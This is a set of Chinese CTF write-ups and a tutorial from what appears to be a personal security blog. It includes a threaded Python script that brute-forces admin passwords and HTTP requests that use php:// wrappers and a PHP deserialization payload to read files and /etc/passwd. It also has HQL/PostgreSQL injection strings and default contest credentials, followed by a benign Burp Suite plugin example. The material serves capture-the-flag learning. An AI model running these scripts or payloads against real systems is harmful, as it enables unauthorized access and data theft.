<p>或者 脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import urllib, urllib2</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">def get(begin):</span><br><span class="line">	right = 0</span><br><span class="line">	index = begin * 10000</span><br><span class="line">	while index &lt; (begin + 1) * 10000:</span><br><span class="line">		URL = &apos;http://ctf1.shiyanbar.com/shian-s/index.php&apos;;</span><br><span class="line">		opener = urllib2.build_opener()</span><br><span class="line">		opener.addheaders.append((&apos;Cookie&apos;, &apos;PHPSESSID=45cehecb1jv2jlsi591hv8l0m&apos; + str(begin)))</span><br><span class="line">		try:</span><br><span class="line">			response = opener.open(URL)</span><br><span class="line">		except urllib2.HTTPError, e:</span><br><span class="line">			continue</span><br><span class="line">		data = response.read()</span><br><span class="line">		if re.search(&apos;服务器安全狗防护验证页面&apos;, data) != None:</span><br><span class="line">			continue</span><br><span class="line">		if re.search(&apos;&lt;br&gt;&lt;br&gt;[0-9]*&lt;br&gt;&lt;br&gt;&apos;, data) == None:</span><br><span class="line">			continue</span><br><span class="line">		rcode = re.search(&apos;&lt;br&gt;&lt;br&gt;[0-9]*&lt;br&gt;&lt;br&gt;&apos;, data).group()</span><br><span class="line">		rcode = rcode[8:11]</span><br><span class="line">		# print(index)</span><br><span class="line">		s = str(index)</span><br><span class="line">		if index &lt; 10000:</span><br><span class="line">			s = s.zfill(5)</span><br><span class="line">		password = s</span><br><span class="line">		formdata = &#123;&apos;username&apos;: &apos;admin&apos;, &apos;password&apos;:password, &apos;randcode&apos;:rcode&#125;</span><br><span class="line">		data_encoded = urllib.urlencode(formdata)</span><br><span class="line">		# req = urllib2.Request(URL, param)</span><br><span class="line">		URL += &apos;?&apos; + data_encoded</span><br><span class="line">		# print(URL)</span><br><span class="line">		# opener = urllib2.build_opener()</span><br><span class="line">		opener.addheaders.append((&apos;Cookie&apos;, &apos;PHPSESSID=45cehecb1jv2jlsi591hv8l0m&apos; + str(begin)))</span><br><span class="line">		try:</span><br><span class="line">			response1 = opener.open(URL)</span><br><span class="line">			status = response1.getcode()</span><br><span class="line">			# print(status == 200)</span><br><span class="line">		except urllib2.HTTPError, e:</span><br><span class="line">			continue</span><br><span class="line"></span><br><span class="line">		f1 = open(&apos;log&apos; + str(begin) + &apos;.txt&apos;, &apos;a&apos;)</span><br><span class="line">		f1.write(str(index) + &quot;\n&quot;)</span><br><span class="line">		f1.close()</span><br><span class="line">		data1 = response1.read()</span><br><span class="line">		if re.search(&apos;服务器安全狗防护验证页面&apos;, data1) != None:</span><br><span class="line">			continue</span><br><span class="line">		# print(re.search(&apos;验证码错误&apos;, data1))</span><br><span class="line">		# print(right)</span><br><span class="line">		if status == 200 and re.search(&apos;密码错误&apos;, data1) == None and re.search(&apos;验证码错误&apos;, data1) == None and re.search(&apos;服务器安全狗防护验证页面&apos;, data1) == None:</span><br><span class="line">			if right == 0:</span><br><span class="line">				right = 1</span><br><span class="line">				index -= 1</span><br><span class="line">				# print(&apos;right&apos; + str(index))</span><br><span class="line">			else:</span><br><span class="line">				print(index)</span><br><span class="line">				f = open(&apos;log.txt&apos;, &apos;a&apos;)</span><br><span class="line">				f.write(str(index))</span><br><span class="line">				f.write(data1)</span><br><span class="line">				f.close()</span><br><span class="line">				break</span><br><span class="line">		else:</span><br><span class="line">			right = 0</span><br><span class="line">		index += 1</span><br><span class="line">		# res = urllib2.urlopen</span><br><span class="line"># get(0)</span><br><span class="line">for i in xrange(10):</span><br><span class="line">	t =threading.Thread(target=get,args=(i,))</span><br><span class="line">	t.start()</span><br></pre></td></tr></table></figure></p>
<h1 id="5-admin"><a href="#5-admin" class="headerlink" title="5. admin"></a>5. admin</h1><p>直接请求，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">you are not admin !</span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
<p>可以用php伪协议绕过，user=php://input，然后post的数据为the user is admin</p>
<p>然后，include部分也可以用PHP伪协议读取文件，file=php://filter/convert.base64-encode/resource=index.php</p>
<p><img src="/img/shianbei/4.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/f1a9/&quot;,$file))&#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file); //class.php</span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        echo $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后发现了class.php，也拿下来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Read&#123;//f1a9.php</span><br><span class="line">    public $file;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(isset($this-&gt;file))&#123;</span><br><span class="line">            echo file_get_contents($this-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;__toString was called!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>看到提示读取f1a9.php</p>
<p>然后，看到__toString方法和$pass = unserialize($pass);，想到反序列化漏洞，构造如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /shian-du/index.php?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125; HTTP/1.1</span><br><span class="line">Host: ctf1.shiyanbar.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: XDEBUG_SESSION=netbeans-xdebug; PHPSESSID=cko7epgroock0vgau9amiri4l5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 17</span><br><span class="line">the user is admin</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/shianbei/5.png" alt=""></p>
<p>然后，就想尝试下这个任意文件读取有多大权限，试了下/etc/passwd发现可以读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /shian-du/index.php?user=php://input&amp;file=php://filter/convert.base64-encode/resource=../../../../../etc/passwd HTTP/1.1</span><br><span class="line">Host: ctf1.shiyanbar.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://src.shiyanbar.com/student/exam-second/seize-flag</span><br><span class="line">Cookie: XDEBUG_SESSION=netbeans-xdebug; PHPSESSID=cko7epgroock0vgau9amiri4l5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 17</span><br><span class="line">the user is admin</span><br></pre></td></tr></table></figure></p>
<p>然后，发现web都是在同一个服务器上面，尝试读取第一题的index.php看看，<br><img src="/img/shianbei/5.png" alt=""><br>发现可以，那么，原则上，通过这道题就可以直接kill掉所有的web题，具有较大危害（可惜前面的题目都自己已经做出来了）。</p>
<h1 id="线下赛"><a href="#线下赛" class="headerlink" title="线下赛"></a>线下赛</h1><h2 id="渗透阶段"><a href="#渗透阶段" class="headerlink" title="渗透阶段"></a>渗透阶段</h2><h3 id="第一题："><a href="#第一题：" class="headerlink" title="第一题："></a>第一题：</h3><p>考了后台弱口令，这。。。admin/MetInfo<br>你会发现过不了这个这题就废了</p>
<h3 id="第二题："><a href="#第二题：" class="headerlink" title="第二题："></a>第二题：</h3><p>phpmyadmin爆破弱口令这。。。root/abc123</p>
<h3 id="第三题："><a href="#第三题：" class="headerlink" title="第三题："></a>第三题：</h3><p>又是一个wooyun上的已知漏洞利用，额，这个是不给网的，跟现实有点脱离吧</p>
<h2 id="攻防阶段"><a href="#攻防阶段" class="headerlink" title="攻防阶段"></a>攻防阶段</h2><p>开始几分钟部分队伍未修改默认密码，考的是关于修改默认密码的知识吧，然而刚刚开始的时候服务器很卡很卡，自己都进不去，这。。。<br>Redis<br>和<br>Drupal<br>和<br>FFmpeg<br>的漏洞，嗯，这个的确是平时没有关注到</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2017/pwn2win-ctf-2017.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="UltramanGaia">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="UltramanGaia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/pwn2win-ctf-2017.html" itemprop="url">pwn2win-ctf-2017</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-27T19:11:00+08:00">
                2017-11-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/writeup/" itemprop="url" rel="index">
                    <span itemprop="name">writeup</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Black-Pentesting"><a href="#Black-Pentesting" class="headerlink" title="Black Pentesting"></a>Black Pentesting</h2><p>Our agents found a BSC server which is used to contact one of the Corp’s sysadmins. We managed to get his IP (45.77.146.27), but we still haven’t found it’s domain. After obtaining the domain, we believe it’s possible to exploit their website somehow, and then obtain sensitive data. Use your old school pentesting skills and you will be rewarded!<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大意是给了IP 45.77.146.27，让你找域名，题目在那里，一直找到的是 45.77.146.27.vultr.com 这个域名，应该是bloodsuckers.world才对，所以，连题目都没看到，进去后是个留言框。</span><br></pre></td></tr></table></figure></p>
<h2 id="criminal"><a href="#criminal" class="headerlink" title="criminal"></a>criminal</h2><p>很容易通过报错显示出SQL语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT c from solutions.bloodsuckers.models.Criminal c WHERE (c.name like :pName or :pNameLength = 0) and (c.age = :pAge or :pAge = 0) and (c.crime like :pCrime or :pCrimeLength = 0) order by xxx</span><br></pre></td></tr></table></figure></p>
<p>且调用关系是应用程序拼接成HQL语句，HQL解析为postgresql后执行<br>order by处存在注入<br>一开始以为是postgresql注入<br>构造这样如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&amp;age=&amp;crime=&amp;order=case when(ascii(substr((current_database()),1,1))=99) then age end desc, case when 1=1 then age end asc&amp;submit=</span><br></pre></td></tr></table></figure></p>
<p>可以获得一些信息，但是发现order by不能用子查询，postgresql是允许的，但是HQL不允许，所以不能到达。<br>其实这应该HQL注入<br>何为HQL注入？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对象关系映射（英语：Object Relational Mapping，简称ORM，或O/RM，或O/R mapping），是一种程序设计技术，用于实现面向对象编程语言里不同类型系统的数据之间的转换。从效果上说，它其实是创建了一个可在编程语言里使用的“虚拟对象数据库”</span><br><span class="line">方便在关系数据库和类似于 Java， C# 等面向对象的编程语言中转换数据的技术</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pwn2win/1.png" alt=""></p>
<p>The nature of ORM injection is similar to SQL injection.<br><img src="/img/pwn2win/3.png" alt=""><br><img src="/img/pwn2win/4.png" alt=""><br><img src="/img/pwn2win/2.png" alt=""><br>POJO=Plain Ordinary Java Object<br><img src="/img/pwn2win/5.png" alt=""></p>
<p><a href="https://github.com/0ang3el/HQLi-playground" target="_blank" rel="noopener">https://github.com/0ang3el/HQLi-playground</a></p>
<h2 id="Hibernate-ORM"><a href="#Hibernate-ORM" class="headerlink" title="Hibernate ORM"></a>Hibernate ORM</h2><ul>
<li>Single Quote Escaping</li>
</ul>
<p>对单引号转义的差异</p>
<ul>
<li>在MySQL中，单引号[‘]转义为[\‘]</li>
<li>在HQL中，单引号[‘]转义为[‘]<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">&apos;abc\&apos;&apos;or 1=(select 1)--&apos;</span><br><span class="line">对于HQL来说是字符串</span><br><span class="line">对于MySQL来说，是字符串加注入的SQL语句</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/img/pwn2win/6.png" alt=""></p>
<ul>
<li>$-Quoted Strings<br>这种方法对允许[\$\$aaa’bbb\$\$]这种方式表示字符串的DBMS有效<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PostgreSQL</span><br><span class="line">H2</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/img/pwn2win/7.png" alt=""><br><img src="/img/pwn2win/8.png" alt=""></p>
<ul>
<li><p>Magic Functions</p>
<ul>
<li>这种方法对能在字符串参数中执行SQL表达式的DBMS有效<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PostgreSQL</span><br><span class="line">Oracle</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PostgreSQL</span><br><span class="line">內建函数query_to_xml(&apos;Arbitrary SQL&apos;)</span><br><span class="line">array_upper(xpath(&apos;row&apos;,query_to_xml(&apos;select 1 where 1337&gt;1&apos;,true, false,&apos;&apos;)),1)</span><br><span class="line">返回行数是否大于0</span><br></pre></td></tr></table></figure>
<p><img src="/img/pwn2win/9.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Oracle 有內建函数DBMS_XMLGEN.getxml(&apos;SQL&apos;)</span><br><span class="line">NVL(TO_CHAR(DBMS_XMLGEN.getxml(&apos;select 1 where 1337&gt;1&apos;)),&apos;1&apos;)!=&apos;1&apos;</span><br><span class="line">返回是否row大于0</span><br></pre></td></tr></table></figure>
<ul>
<li>UNICODE</li>
</ul>
<p>这种方法对于允许用Unicode字符作为分隔符的DBMS有用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mssql</span><br><span class="line">H2</span><br></pre></td></tr></table></figure></p>
<p>所以这里利用了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$$      在HQL中是变量名</span><br><span class="line">$$xxx$$ 在postgresql中是字符串</span><br></pre></td></tr></table></figure>
<p>构造，通过报错将flag显示出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT c from solutions.bloodsuckers.models.Criminal c WHERE (c.name like :pName or :pNameLength = 0) and (c.age = :pAge or :pAge = 0) and (c.crime like :pCrime or :pCrimeLength = 0) order by case when (555=(select 0 from Criminal c where $$=&apos;$$= concat(  chr(61),chr(39)) and (cast((select flag::text from flag) as integer)=2)) then 1 else 5 end --&apos;)) then 1 else 5 end desc</span><br></pre></td></tr></table></figure></p>
<p>还有人用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast(cast(pg_read_binary_file(&apos;pg_xlog/000000010000000000000001&apos;)as text) as int)</span><br></pre></td></tr></table></figure></p>
<p>看日志，这思路很强</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2017/Burp-Suite插件开发.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="UltramanGaia">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="UltramanGaia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/Burp-Suite插件开发.html" itemprop="url">Burp Suite插件开发</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-25T18:13:49+08:00">
                2017-11-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/教程/" itemprop="url" rel="index">
                    <span itemprop="name">教程</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Burp-Suite是一个用于攻击web应用程序的集成平台"><a href="#Burp-Suite是一个用于攻击web应用程序的集成平台" class="headerlink" title="Burp Suite是一个用于攻击web应用程序的集成平台"></a>Burp Suite是一个用于攻击web应用程序的集成平台</h1><p>我们来学习下如何编写插件增强Burp Suite的功能</p>
<h1 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h1><h2 id="Step-1-导出SDK包"><a href="#Step-1-导出SDK包" class="headerlink" title="Step 1 导出SDK包"></a>Step 1 导出SDK包</h2><p><img src="/img/burpsuite/1.png" alt=""></p>
<h2 id="Step-2-新建一个java项目，将刚刚导出的burp目录复制到src目录下，再创建一个包，里面放我们自己的代码"><a href="#Step-2-新建一个java项目，将刚刚导出的burp目录复制到src目录下，再创建一个包，里面放我们自己的代码" class="headerlink" title="Step 2 新建一个java项目，将刚刚导出的burp目录复制到src目录下，再创建一个包，里面放我们自己的代码"></a>Step 2 新建一个java项目，将刚刚导出的burp目录复制到src目录下，再创建一个包，里面放我们自己的代码</h2><p><img src="/img/burpsuite/2.png" alt=""></p>
<h2 id="网上找了个代码，测试下"><a href="#网上找了个代码，测试下" class="headerlink" title="网上找了个代码，测试下"></a>网上找了个代码，测试下</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">package InformationGather;</span><br><span class="line">import burp.*;</span><br><span class="line">import java.awt.Component;</span><br><span class="line">import java.awt.event.MouseAdapter;</span><br><span class="line">import java.awt.event.MouseEvent;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line">import javax.swing.JButton;</span><br><span class="line">import javax.swing.JPanel;</span><br><span class="line">import javax.swing.SwingUtilities;</span><br><span class="line">public class BurpExtender implements IBurpExtender, ITab &#123;</span><br><span class="line">    public PrintWriter stdout;</span><br><span class="line">    public IExtensionHelpers hps;</span><br><span class="line">    public IBurpExtenderCallbacks cbs;</span><br><span class="line">    public JPanel jPanelMain;</span><br><span class="line">    @Override</span><br><span class="line">    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)         &#123;</span><br><span class="line">        callbacks.setExtensionName(&quot;BurpExtender&quot;);</span><br><span class="line">        this.hps = callbacks.getHelpers();</span><br><span class="line">        this.cbs = callbacks;</span><br><span class="line">        this.stdout = new PrintWriter(callbacks.getStdout(), true);</span><br><span class="line">        this.stdout.println(&quot;hello burp!&quot;);</span><br><span class="line">        SwingUtilities.invokeLater(new Runnable() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                jPanelMain = new JPanel();</span><br><span class="line">                JButton jButton = new JButton(&quot;老司机,快点我!&quot;);</span><br><span class="line">                jButton.addMouseListener(new MouseAdapter() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    public void mouseClicked(MouseEvent e)&#123;</span><br><span class="line">                        stdout.println(&quot;哔...&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">                // 将按钮添加到 主面板 jPanelMain 中.</span><br><span class="line">                jPanelMain.add(jButton);</span><br><span class="line">                // 设置自定义组件并添加标签</span><br><span class="line">                cbs.customizeUiComponent(jPanelMain);</span><br><span class="line">                cbs.addSuiteTab(BurpExtender.this);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    // 实现 ITab 接口的 getTabCaption 方法</span><br><span class="line">    @Override</span><br><span class="line">    public String getTabCaption() &#123;</span><br><span class="line">        return &quot;Burp 标签测试&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    // 实现 ITab 接口的 getUiComponent 方法</span><br><span class="line">    @Override</span><br><span class="line">    public Component getUiComponent() &#123;</span><br><span class="line">        return jPanelMain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Step-3-导出jar包"><a href="#Step-3-导出jar包" class="headerlink" title="Step 3 导出jar包"></a>Step 3 导出jar包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File-&gt;project stucture -&gt; Artifacts-&gt;&quot;+&quot;,选jar 选择from modules with dependencies，然后会有配置窗口出现，配置完成后，勾选Build on make &gt;ok保存</span><br><span class="line">Build-&gt;make project</span><br></pre></td></tr></table></figure>
